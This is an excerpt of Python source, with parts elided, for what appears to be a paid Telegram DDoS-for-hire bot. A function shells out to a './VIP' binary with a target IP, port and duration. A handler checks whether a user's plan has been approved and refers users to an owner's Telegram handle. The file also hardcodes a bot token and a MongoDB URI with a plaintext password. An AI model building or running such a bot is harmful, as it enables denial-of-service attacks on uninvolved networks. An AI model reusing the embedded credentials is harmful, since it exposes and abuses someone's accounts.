...
TOKEN = '7284251491:AAHNAlQZSou-3MbuBBR_eDUbSUZaCjEELIA'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002056835537
CHANNEL_ID = -1002056835537
error_channel_id = -1002056835537
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./VIP {target_ip} {target_port} {duration} 100")
...
def myinfo_command(message):
    ...
    if not user_data:
        ...
        response += "*For assistance, please contact the owner: @RohitRWA0* "  # Contact owner message
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
        response += "*Please reach out to the owner for assistance: @RohitRWA0* 🙏"  # Contact owner message
    else:
